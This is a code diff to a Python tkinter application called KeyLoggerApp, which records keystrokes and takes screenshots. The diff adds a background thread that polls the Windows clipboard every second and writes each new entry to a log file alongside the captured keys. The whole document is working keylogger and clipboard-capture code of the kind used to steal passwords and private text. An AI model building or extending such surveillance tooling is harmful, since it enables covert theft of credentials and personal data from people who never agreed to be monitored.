@@ -2,6 +2,9 @@ import tkinter as tk
 from pynput import keyboard, mouse
 import pyautogui
 import os
+import time
+import win32clipboard
+import threading
 
 class KeyLoggerApp:
     def __init__(self, root):
@@ -15,6 +18,7 @@ class KeyLoggerApp:
         self.restart_button.pack(pady=10)
 
         self.pressed_keys = []
+        self.clipboard_logs = []
         self.screenshot_count = 1
         self.recording_counter = 1
         self.output_path = "D:/code_dao/py/output/"
@@ -71,26 +75,46 @@ class KeyLoggerApp:
         self.stop_button.config(state=tk.NORMAL)
         self.restart_button.config(state=tk.DISABLED)
         self.pressed_keys = []
+        self.clipboard_logs = []
         self.screenshot_count = 1
         self.recording_counter += 1
         self.keys_file_path = os.path.join(self.output_path, f"recorded_keys_{self.recording_counter}.txt")
         self.start_listening()
 
+        # Start clipboard monitoring in a separate thread
+        threading.Thread(target=self.monitor_clipboard).start()
+
     def stop_recording(self):
         self.stop_button.config(state=tk.DISABLED)
         self.restart_button.config(state=tk.NORMAL)
         self.stop_listening()
-        print("Recorded keys:", self.pressed_keys)
-        with open(self.keys_file_path, "w") as keys_file:
+
+        # Specify the encoding as 'utf-8' when opening the file
+        with open(self.keys_file_path, "w", encoding="utf-8") as keys_file:
+            keys_file.write("Recorded keys:\n")
             keys_file.write("\n".join(self.pressed_keys))
-            print(f"Recorded keys saved to: {self.keys_file_path}")
+            keys_file.write("\n\nClipboard logs:\n")
+            keys_file.write("\n".join(self.clipboard_logs))
+            print(f"Recorded data saved to: {self.keys_file_path}")
 
     def restart_recording(self):
         self.stop_button.config(state=tk.NORMAL)
         self.restart_button.config(state=tk.DISABLED)
         self.start_recording()
 
+    def monitor_clipboard(self):
+        while True:
+            win32clipboard.OpenClipboard()
+            clipboard_data = win32clipboard.GetClipboardData()
+            win32clipboard.CloseClipboard()
+            if clipboard_data and clipboard_data not in self.clipboard_logs:
+                self.clipboard_logs.append(clipboard_data)
+                print(f"Clipboard log: {clipboard_data}")
+            time.sleep(1)
+
 if __name__ == "__main__":
+    import threading
+
     root = tk.Tk()
     app = KeyLoggerApp(root)
     root.mainloop()
